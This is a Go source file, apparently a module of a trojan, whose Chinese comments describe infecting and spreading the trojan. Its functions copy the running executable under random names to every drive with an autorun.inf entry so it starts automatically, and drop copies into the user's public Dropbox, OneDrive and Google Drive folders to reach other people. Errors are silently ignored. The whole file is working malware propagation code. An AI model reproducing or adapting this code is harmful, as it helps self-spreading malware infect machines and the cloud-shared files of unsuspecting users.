/*
Author: FreeKnight
对木马进行感染传播
 */
//------------------------------------------------------------
package components
//------------------------------------------------------------
import (
	"math/rand"
	"os"
	"errors"
)
//------------------------------------------------------------
// 感染/传播本木马
func infection(inf string) (string, error){
	switch inf {	// 感染类型
		case "0":
			go driveInfection()
			go dropboxInfection()
			go onedriveInfection()
			go googledriveInfection()

			return "Infection sucessed.", nil
		case "1":
			go dropboxInfection()
			return "Infection sucessed.", nil
		case "2":
			go onedriveInfection()
			return "Infection sucessed.", nil
		case "3":
			go googledriveInfection()
			return "Infection sucessed.", nil
		case "4":
			go driveInfection()
			return "Infection sucessed.", nil
	}

	return "", errors.New("Unknown infection type")
}
//------------------------------------------------------------
// 自我感染
// 把本木马拷贝到多个硬盘，并都设置为自动启动
func driveInfection() {
	for i := 0; i < len(driveNames); i++ {
		if checkIsFileExist(driveNames[i] + ":\\") {
			filename := spreadNames[rand.Intn(len(spreadNames))] + ".exe"
			err := copyFileToDirectory(os.Args[0], driveNames[i]+":\\"+filename)
			if err != nil {
			}
			err2 := createFileAndWriteData(driveNames[i]+":\\autorun.inf", []byte("[AutoRun] action="+filename))
			if err2 != nil {
			}
		}
	}
}
//------------------------------------------------------------
// 丢到dropBox文件夹进行感染
func dropboxInfection() {
	if checkIsFileExist(os.Getenv("USERPROFILE") + "\\Dropbox\\Public") {
		filename := spreadNames[rand.Intn(len(spreadNames))] + ".exe"
		err := copyFileToDirectory(os.Args[0], os.Getenv("USERPROFILE")+"\\Dropbox\\Public\\"+filename)
		if err != nil {
		}
	}
}
//------------------------------------------------------------
// 丢到oneDrive文件夹进行感染
func onedriveInfection() {
	if checkIsFileExist(os.Getenv("USERPROFILE") + "\\OneDrive\\Public") {
		filename := spreadNames[rand.Intn(len(spreadNames))] + ".exe"
		err := copyFileToDirectory(os.Args[0], os.Getenv("USERPROFILE")+"\\OneDrive\\Public\\"+filename)
		if err != nil {
		}
	}
}
//------------------------------------------------------------
// 丢到googleDrive文件夹进行感染
func googledriveInfection() {
	if checkIsFileExist(os.Getenv("USERPROFILE") + "\\Google Drive") {
		filename := spreadNames[rand.Intn(len(spreadNames))] + ".exe"
		err := copyFileToDirectory(os.Args[0], os.Getenv("USERPROFILE")+"\\Google Drive\\"+filename)
		if err != nil {
		}
	}
}
//------------------------------------------------------------